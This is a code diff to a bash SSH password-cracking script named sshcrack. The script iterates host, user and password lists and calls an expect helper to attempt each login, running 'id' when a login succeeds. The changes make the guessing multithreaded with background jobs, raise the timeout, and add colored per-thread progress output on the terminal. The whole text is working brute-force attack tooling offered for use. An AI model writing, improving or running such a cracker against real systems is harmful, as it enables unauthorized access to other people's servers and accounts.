@@ -7,9 +7,37 @@ declare host_list_num=0
 declare user_list_num=0
 declare passwd_list_num=0
 declare sshcrack_logfile="sshcrack.log"
-declare sshcrack_timeout=5
+declare sshcrack_timeout=10
 declare sshcrack_threadnum=1
 declare sshcrack_flag=0
+declare total_run_time
+declare max_row_num
+
+declare -a playx=('/' '|' '\\' '-')
+declare playx_len=4
+
+function sshcrack_show_arg()
+{
+        echo -ne "\033[2;1H"
+        echo -ne "\033[31;1mhost: $host_list_num | users: $user_list_num | passwd: $passwd_list_num"
+	echo -e " thread: $sshcrack_threadnum | timeout: $sshcrack_timeout | logfile: $sshcrack_logfile\n\033[0m"
+}
+
+function sshcrack_init()
+{
+        echo -ne "\033[2J"
+        MAX_ROW_NUM=`stty size|cut -d " " -f 1`
+        MAX_COL_NUM=`stty size|cut -d " " -f 2`
+        max_row_num=$((MAX_ROW_NUM-5))
+}
+
+function sshcrack_exit()
+{
+	local x=$((sshcrack_threadnum + 6)) y=1
+
+	echo -e "\033[${x}:${y}Hwaiting all threads to finsh...\033[0m"
+        #echo -e "\033[?25h"
+}
 
 function sshcrack_show_hlist()
 {
@@ -78,17 +106,16 @@ function sshcrack_init()
 
 function do_sshcrack()
 {
-	local ret
+	local ret x=$(($1+4)) y=1
 
-	printf "Thread[%2d]\t%s@%s\t\t==>\t[%-16s]\t" $1 $2 $3 $4
 	./sshcrack.exp $3 $2 $4 $5 $6 >/dev/null
 	ret=$?
-	if [ $ret -eq 0 ];then 
-		echo -ne "[success]\n"
+	if [ $ret -eq 6 ];then 
+		printf "\033[${x}:${y}H\033[32;1mThread[%2d]\t%s@%s\t\t==>\t[%-16s]\t[success]\t%2d\n\033[0m" $1 $2 $3 $4 $ret
 		sshcrack_flag=1
 		return 0
 	else
-		echo -ne "[failed]\n"
+		printf "\033[${x}:${y}H\033[32;1mThread[%2d]\t%s@%s\t\t==>\t[%-16s]\t[failed]\t%2d\n\033[0m" $1 $2 $3 $4 $ret
 	fi
 	return 1
 }
@@ -103,14 +130,16 @@ function sshcrack_engine()
 		do
 			for passwd in ${passwd_list[*]}
 			do
-				#if [ $thread_num -gt $sshcrack_threadnum ]; then
-				#	wait; thread_num=0; continue
-				#fi
-				#{
-				#((thread_num++))
-				do_sshcrack $thread_num $user $host $passwd "exit" $sshcrack_timeout
-				#}&
-				[ $sshcrack_flag -eq 1 ] && wait && exit
+				if [ $thread_num -gt $sshcrack_threadnum ]; then
+					wait; thread_num=0; sleep 0.5; continue
+				fi
+				((thread_num++))
+				{
+				do_sshcrack $thread_num $user $host $passwd "id" $sshcrack_timeout
+				if [ $sshcrack_flag -eq 1 ]; then
+					wait && return 0
+				fi
+				}&
 			done
 		done
 	done
@@ -167,7 +196,10 @@ function main()
         esac
         done
 
+	sshcrack_init
+	sshcrack_show_arg
 	sshcrack_engine
+	sshcrack_exit
 }
 
 main $@
